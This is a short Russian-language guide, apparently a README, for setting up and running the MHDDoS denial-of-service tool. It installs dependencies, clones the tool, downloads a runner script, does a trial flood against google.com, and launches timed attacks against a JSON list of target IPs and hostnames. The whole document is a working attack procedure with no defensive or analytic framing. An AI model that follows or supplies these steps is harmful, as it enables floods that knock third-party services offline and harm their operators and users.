1. Установите инструментарий
```
sudo apt-get update
sudo apt-get install -y jq python3-pip python-pyasn1
pip install pyasn1==0.4.6
```

2. Установите на сервере MHDDoS
```
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt
```

3. Выполните холостой запуск для подргужения прокси
```
 python3 start.py STRESS https://google.com 0 1 0 1 1
 ```

4. установите раннер
```
curl https://raw.githubusercontent.com/rxitech/k6clean/master/runner.sh > runner.sh
```

5. Создайте targets.json файл с целями в следующем формате
```
{
 "127.0.0.1": "localhost",
 "172.217.19.78": "google.com",
}
```

6. Запустите раннер передав файл с целями и продолжительность выполнения в секундах
```
./runner.sh targets.json 300
```
